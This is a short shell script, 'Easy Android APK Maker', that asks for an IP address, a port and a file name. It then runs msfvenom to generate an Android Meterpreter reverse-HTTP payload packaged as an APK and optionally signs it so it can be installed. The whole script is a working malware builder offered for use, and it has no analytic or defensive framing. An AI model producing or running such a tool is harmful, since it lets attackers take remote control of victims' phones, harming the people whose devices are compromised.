#!/bin/sh
echo '###################################'
echo '###################################'
echo '##### Easy Android APK Maker ######'
echo '###################################'
echo '###################################'
echo 'Enter your public IP address'
read Public_IP
echo 'Enter the port you want to listen'
read LPort
echo 'Enter APK name'
read APKName
msfvenom -p android/meterpreter/reverse_http lhost=$Public_IP lport=$LPort R>$APKName
echo 'Do you want to sign your apk? y/n'
read APKSign
if [ $APKSign = 'y' ]; then
d2j-apk-sign $APKName
fi
echo 'OK Done. Pick it up!'
